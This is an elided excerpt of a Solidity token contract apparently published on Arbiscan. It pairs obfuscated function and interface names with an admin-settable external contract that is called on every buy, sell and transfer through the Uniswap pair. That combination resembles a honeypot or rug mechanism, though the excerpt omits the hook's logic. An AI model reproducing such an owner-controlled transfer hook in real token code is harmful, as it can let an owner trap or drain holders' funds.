/**
 *Submitted for verification at Arbiscan.io on 2023-12-25
*/

/**
 *Submitted for verification at Arbiscan.io on 2023-12-17
*/
...
contract TOKEN is HUAXIERC20, HUAXIConlse {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    address _tokenOwner;
    IUserAmountdoseoo public doseoo;
    address public contractSender;

    address private _noneAddress = address(0x000000000000000000000000000000000000dEaD);

    constructor(address tokenOwner, string memory _name, string memory _symbol, uint256 _totalSupply) HUAXIERC20(_name, _symbol, _totalSupply, msg.sender) {
        ...
        contractSender = tokenOwner;
    }


    function cuerheedBrtingRffor(IUserAmountdoseoo _doseoo) public  onlyRole(DEFAULT_ADMIN_ROLE) {
        doseoo = _doseoo;
    }
    ...
    function _HUAXIexceeds(address from, address to,uint256 amount) internal {
        ...
        if(from == uniswapV2Pair){
            ...
            doseoo.addInAmount(to, amount);
        }else if(to == uniswapV2Pair){
            doseoo.addOutAmount(from, amount);
        }else{
            doseoo.addOutAmount(from, amount);
            takeFee = false;
        }
